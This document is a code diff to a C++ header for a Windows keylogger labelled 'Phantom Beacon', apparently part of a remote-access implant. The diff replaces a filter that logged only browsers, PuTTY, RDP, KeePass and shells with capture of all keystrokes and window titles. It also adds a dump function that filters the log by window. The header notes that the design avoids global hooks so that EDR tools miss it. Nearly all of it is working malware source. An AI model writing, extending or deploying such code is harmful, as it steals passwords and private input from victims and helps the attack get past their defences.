@@ -2,10 +2,17 @@
 // ============================================================================
 //  keylogger.h — Phantom Beacon Context-Aware Keylogger
 //  ─────────────────────────────────────────────────────
-//  Logs keystrokes only when specific target applications are in the
-//  foreground. Uses GetAsyncKeyState in a background thread to avoid
+//  Logs keystrokes. Uses GetAsyncKeyState in a background thread to avoid
 //  global hooks (SetWindowsHookEx) which trigger EDRs.
 // ============================================================================
+
+#include <string>
+#include <vector>
+#include <thread>
+#include <mutex>
+#include <atomic>
+#include <map>
+#include <sstream>
 
 #ifdef _WIN32
     #ifndef WIN32_LEAN_AND_MEAN
@@ -15,34 +22,15 @@
 #else
     #include <chrono>
 #endif
-#include <string>
-#include <vector>
-#include <thread>
-#include <mutex>
-#include <atomic>
 
 namespace keylogger {
-
-// ── Target Applications ────────────────────────────────────────────────────
-// Only log keystrokes if the active window belongs to one of these processes.
-static const std::vector<std::string> TARGET_APPS = {
-    "chrome.exe",
-    "firefox.exe",
-    "msedge.exe",
-    "iexplore.exe",
-    "putty.exe",
-    "mstsc.exe",
-    "keepass.exe",
-    "keepassxc.exe",
-    "cmd.exe",
-    "powershell.exe"
-};
 
 // ── Shared State ───────────────────────────────────────────────────────────
 inline std::mutex log_mutex;
 inline std::string key_buffer;
 inline std::atomic<bool> is_running{false};
 inline std::thread kl_thread;
+static std::map<int, bool> key_pressed;
 
 #ifdef _WIN32
 // ── Helper: Get Active Window Title ────────────────────────────────────────
@@ -80,7 +68,7 @@ inline std::string TranslateKey(int vk, bool shift, bool caps) {
         case VK_ESCAPE:  return "[ESC]";
         case VK_CONTROL: return "[CTRL]";
         case VK_MENU:    return "[ALT]";
-        case VK_LBUTTON: return ""; // Ignore mouse clicks
+        case VK_LBUTTON: return ""; 
         case VK_RBUTTON: return "";
         case VK_OEM_1:      return shift ? ":" : ";";
         case VK_OEM_PLUS:   return shift ? "+" : "=";
@@ -100,11 +88,13 @@ inline std::string TranslateKey(int vk, bool shift, bool caps) {
 // ── Thread Loop ────────────────────────────────────────────────────────────
 inline void KeyloggerLoop() {
     std::string lastTitle = "";
+    
     // Reset key states
     for (int i = 0; i < 256; ++i) GetAsyncKeyState(i);
 
     while (is_running) {
         std::string currentTitle = GetActiveWindowTitle();
+
         if (currentTitle != lastTitle) {
             std::lock_guard<std::mutex> lock(log_mutex);
             key_buffer += "\n\n[Window: " + currentTitle + "]\n";
@@ -115,40 +105,68 @@ inline void KeyloggerLoop() {
         bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
         for (int i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) & 1) {
-                std::string key = TranslateKey(i, shift, caps);
-                if (!key.empty()) {
-                    std::lock_guard<std::mutex> lock(log_mutex);
-                    key_buffer += key;
-                    if (key_buffer.size() > 1024 * 1024) {
-                        key_buffer = key_buffer.substr(key_buffer.size() - 512 * 1024);
+            bool is_down = (GetAsyncKeyState(i) & 0x8000) != 0;
+            
+            if (is_down) {
+                if (!key_pressed[i]) { // Debounce
+                    std::string key = TranslateKey(i, shift, caps);
+                    if (key.empty() && i >= 32 && i <= 126) key = std::string(1, (char)i);
+                    
+                    if (!key.empty()) {
+                        std::lock_guard<std::mutex> lock(log_mutex);
+                        key_buffer += key;
                     }
+                    key_pressed[i] = true;
                 }
+            } else {
+                key_pressed[i] = false;
             }
         }
-        Sleep(10);
+        
+        Sleep(20);
     }
 }
-#else
-inline void KeyloggerLoop() {
-    while (is_running) {
-        // POSIX stub
-        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
-    }
-}
-#endif
 
 // ── Interface ──────────────────────────────────────────────────────────────
+inline std::string dump(const std::string& filter = "") {
+    std::lock_guard<std::mutex> lock(log_mutex);
+    if (key_buffer.empty()) return "Buffer is empty. No keystrokes captured yet.";
+    
+    if (filter.empty()) {
+        std::string out = "--- KEYLOG DUMP ---\n" + key_buffer + "\n--- END DUMP ---";
+        key_buffer.clear();
+        return out;
+    }
+
+    std::string filtered_out = "--- KEYLOG DUMP (Filter: " + filter + ") ---\n";
+    std::string line;
+    std::istringstream stream(key_buffer);
+    bool in_target_window = false;
+
+    while (std::getline(stream, line)) {
+        if (line.find("[Window:") != std::string::npos) {
+            in_target_window = (line.find(filter) != std::string::npos);
+        } else if (in_target_window) {
+            filtered_out += line + "\n";
+        }
+    }
+    filtered_out += "--- END DUMP ---";
+    return filtered_out;
+}
+#else
+inline std::string start() { return "Keylogger not supported on this platform."; }
+inline std::string stop() { return "Keylogger not supported."; }
+inline std::string dump(const std::string& filter = "") { return "Keylogger not supported."; }
+#endif
+
+// ── Interface Start/Stop ──────────────────────────────────────────────────
+#ifdef _WIN32
 inline std::string start() {
     if (is_running) return "Keylogger is already running.";
     is_running = true;
     kl_thread = std::thread(KeyloggerLoop);
     kl_thread.detach();
-#ifdef _WIN32
-    return "Keylogger started. Monitoring target applications.";
-#else
-    return "Keylogger started (POSIX stub active, no events captured).";
-#endif
+    return "Keylogger started. Monitoring all keystrokes and windows.";
 }
 
 inline std::string stop() {
@@ -156,14 +174,6 @@ inline std::string stop() {
     is_running = false;
     return "Keylogger stopped.";
 }
-
-inline std::string dump() {
-    std::lock_guard<std::mutex> lock(log_mutex);
-    if (key_buffer.empty()) return "Buffer is empty.";
-    
-    std::string out = key_buffer;
-    key_buffer.clear();
-    return out;
-}
+#endif
 
 } // namespace keylogger
